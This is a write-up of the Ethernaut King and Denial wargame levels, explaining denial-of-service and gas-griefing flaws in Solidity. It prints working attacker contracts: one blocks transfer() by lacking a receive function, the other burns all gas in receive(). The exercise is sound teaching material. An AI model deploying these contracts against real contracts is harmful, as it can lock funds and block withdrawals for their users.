## Denial of service / gas griefing

### Ethernaut #9 King

This simple contract is assigns the creator as the owner during construction, the creator is also set as the ```king```.  After that everytime someone sends Eth to the contract they will become king if they send a value larger than the previously sent value.  At the end the owner will try to reclaim the value.  Our objective is to prevent the owner from claiming the contract.  

```Java
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

When I deployed this on Polygon Mumbai the initial value of the contract was 0.001 MATIC.  One thing to note is that this contract is written in Solidity 0.8.0, but the Eth is sent via ```.transfer()``` which is no longer the preferred method of sending Eth.  ```.transfer()``` requires 2300 gas to send.  The preferred method now is: ```.call()```.  ```.call()``` will return a boolean, and continue if the send worked or not, but ```.transfer()``` will simple revert if the send cannot take place.  Maybe we can prevent ```.transfer()``` from executing.  Yes, we can do that with a contract that doesn't have ```fallback()``` or ```receive()``` functions.  

The attack will works something like this: 

1. create a contract with no ```fallback()``` or ```receive()``` 
2. The attacker contract will send more than 0.001 MATIC to the victim

The following code accomplishes this: 

```Java
contract KingAttacker {
    constructor() payable {
        require(msg.value > 0.001 ether);
    }

    function attack(address _victim) external {
        (bool callSucessful,) = payable(_victim).call{value: address(this).balance}("");
        require(callSucessful, "Call didn't go through");
    }
}
```

### Ethernaut #20 Denial

This is a simple wallet that withdraws funds slowly.  The objective here is to prevent the original owner from being able to withdraw funds.  If you become a partner you can also receive funds.  Let's take a look at the withdraw method.  

```Java
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }
```

Funds are sent to the partner with an unchecked ```.call()``` so this prevents the partner from not implementing ```receive()```.  ```.transfer()``` has a gas limit of 2300, however there is no gas limit on ```.call()```.  Perhaps we can trigger some gas intensive operations when Ether is sent to us.  

Code to do this is given below.  

```Java
contract DenialAttacker {
    uint dummy; 

    receive() payable external {
        for (uint i; i<9999999999; i++){
            dummy = i;
        }
    }
}
```

This was sucessful.  One way to fix this is not call an external contract.  You could instead tell the user that thier funds were ready for withdraw.  